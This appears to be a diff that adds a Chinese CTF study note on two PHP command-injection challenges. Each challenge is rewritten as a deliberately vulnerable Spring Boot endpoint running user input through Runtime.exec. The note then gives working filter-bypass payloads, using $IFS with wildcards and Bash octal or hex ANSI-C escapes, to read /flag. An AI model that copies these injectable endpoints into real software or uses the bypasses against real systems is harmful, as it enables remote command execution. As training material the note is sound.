@@ -1,0 +1,175 @@
+function hello_shell($cmd){
+    if(preg_match("/flag| /", $cmd)){
+        die("WAF!");
+    }
+    system($cmd);
+}
+
+isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;
+
+highlight_file(__FILE__);
+
+
+
+翻译成java代码
+
+@GetMapping("/")
+    public String helloShell(@RequestParam String cmd) {
+
+        // ======================= 等价 PHP 过滤规则 =======================
+        if (cmd.contains("flag") || cmd.contains(" ")) {
+            return "WAF!"; // 过滤：关键词 flag + 空格
+        }
+        // =================================================================
+
+        try {
+            // 执行系统命令（等价 system($cmd)）
+            Process process = Runtime.getRuntime().exec(cmd);
+
+            // 返回命令结果
+            java.util.Scanner scanner = new java.util.Scanner(process.getInputStream()).useDelimiter("\\A");
+            return scanner.hasNext() ? scanner.next() : "无结果";
+
+        } catch (Exception e) {
+            return "执行失败";
+        }
+    }
+
+
+现在要绕过这个flag和空格的过滤，本质上就是要考虑既不能被过滤，又要能被linux执行的命令，所以本质上是考linux的命令语法
+
+http://你的地址/?cmd=cat$IFS/fl*
+
+绕过空格过滤（用 $IFS）
+绕过 flag 关键词过滤（用 fl*）
+成功读取 /flag
+
+
+
+
+
+
+
+
+
+
+
+function hello_shell($cmd){
+    if(preg_match("/[A-Za-z\"%*+,-.\/:;=>?@[\]^`|]/", $cmd)){
+        die("WAF!");
+    }
+    system($cmd);
+}
+
+isset($_GET['cmd']) ? hello_shell($_GET['cmd']) : null;
+
+highlight_file(__FILE__);
+
+翻译成java代码
+
+
+
+ @GetMapping("/")
+    public String helloShell(@RequestParam String cmd) {
+
+        // ======================== 【关键过滤】 ========================
+        // 等价 PHP: preg_match("/[A-Za-z\"%*+,-.\/:;=>?@[\]^`|]/", $cmd)
+        if (cmd.matches(".*[A-Za-z\"%*+,.\\-/:;=>?@\\[\\]^`|].*")) {
+            return "WAF!"; // 触发拦截
+        }
+        // =================================================================
+
+        try {
+            // 执行系统命令（等价 system($cmd)）
+            Process process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
+
+            // 读取输出
+            java.util.Scanner s = new java.util.Scanner(process.getInputStream()).useDelimiter("\\A");
+            return s.hasNext() ? s.next() : "无结果";
+
+        } catch (Exception e) {
+            return "执行失败";
+        }
+    }
+
+
+
+
+因为不能打字母，所以要用八进制代替
+比如：
+cat /flag
+不能直接写
+要写成：
+
+cmd=$'\143\141\164'$'\040'$'\146\154\141\147'
+
+
+普通 Linux /bin/sh 不认，只有 Bash 专属语法才认。
+
+
+1. 先讲核心：$'\xxx' 是谁的语法？
+bash
+运行
+$'\143\141\164'
+这是 Bash 独有：ANSI-C 转义字符串
+\143 是八进制 ASCII
+Bash 会自动把八进制转成真实字符
+\143 → 99 → c
+\141 → 97 → a
+\164 → 116 → t
+合起来：$'\143\141\164' ➜ 就是 cat
+
+
+2. 为什么普通 Linux 不行？
+Linux 有很多种 Shell：
+/bin/dash（Ubuntu 默认 sh）
+/bin/busybox sh（alpine 容器默认）
+/bin/bash
+dash、busybox-sh：不支持 $'\八进制' 语法，直接报错
+只有 Bash 支持这种转义写法
+所以题目里特意写了一行：
+dockerfile
+RUN ln -sf /bin/bash /bin/sh
+强行把系统默认 sh 换成 bash，就是为了让这个八进制写法能生效。
+
+
+3. 回到你这道 PHP / Java 代码
+php 的 system() 默认调用 /bin/sh
+不改软链接 → sh 是 dash/busybox → 八进制 payload 失效
+改完 sh→bash → 完美解析 $'\xxx'
+我刚才给你的 SpringBoot 代码里：
+java
+运行
+Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
+手动指定用 bash 执行，就是为了复刻题目环境，保证八进制能跑。
+
+
+4. 通俗大白话
+Linux 本身原生不认这种八进制命令写法
+是 Bash 自己加的「特殊语法福利」
+CTF 题目人为把环境换成 Bash，就是给你留这个绕过口子
+过滤了所有字母，你打不出 cat，就只能用八进制拼出来
+
+
+5. 补充：同类型还有什么？
+除了八进制 \xxx，bash 还支持：
+十六进制 $'\x63'
+unicode 转义
+都是用来：禁用字母、禁用关键词时，无字符执行命令
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
